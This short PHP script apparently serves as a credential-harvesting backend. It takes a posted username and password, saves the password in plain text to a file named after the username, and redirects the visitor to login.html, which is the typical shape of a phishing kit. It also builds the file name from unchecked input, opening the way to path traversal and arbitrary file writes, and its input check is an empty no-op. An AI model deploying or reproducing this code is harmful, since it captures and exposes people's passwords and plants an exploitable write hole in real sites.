<?php header('location: login.html')?>
<html>
<head>
	<title></title>
</head>
<body>
	<?php
	$uname = $_POST["uname"];
	$pass = $_POST["pass"];
	if(!isset($uname) || !isset($pass))
	{
		;
	}

	$fileName = $uname."_pass.txt";
	$fileHandle = fopen($fileName,'w') or die("can't open file!!");

	fclose($fileHandle);

	$handle = fopen($fileName, 'a');
	fwrite($handle,$_POST['pass']);

	fclose($handle);


	?>
</body>
</html>